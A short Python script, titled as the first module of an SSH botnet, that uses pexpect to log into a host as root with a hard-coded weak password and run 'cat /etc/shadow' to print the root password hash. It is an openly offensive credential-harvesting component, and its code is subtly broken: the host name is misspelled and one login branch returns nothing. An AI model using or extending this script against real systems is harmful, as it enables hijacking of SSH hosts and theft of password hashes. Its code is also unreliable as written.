#!/usr/bin/python3

"""
A SSH BotNet
Module 1 - Interacting To SSH through Pexpect
"""

import pexpect

PROMPT = ['#','$','>','>>>']

def sendCmd(child,cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)


def connect( user, host, password ):
    ssh_new = "Are you sure you want to continue"
    ssh_con = "ssh "+user+"@"+host
    
    child   = pexpect.spawn(ssh_con)
    ret     = child.expect([pexpect.TIMEOUT,ssh_new,'[P|p]assword:'])
    
    if( ret == 0 ):
        print("[-] Error Connecting ")
        return
    if( ret == 1 ):
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT,'[P|p]assword:'])
        if( ret == 0 ):
            print("[-] Error Connecting ")
            return
        child.sendline(password)
        child.expect(PROMPT)
        return child


def main():
    host     = "loaclhost"
    user     = "root"
    password = "letmein"
    command  = "cat /etc/shadow | grep root"
    
    child    = connect(user,host,password)
    sendCmd(child,command)
    
    
if( __name__ == '__main__' ):
    main()
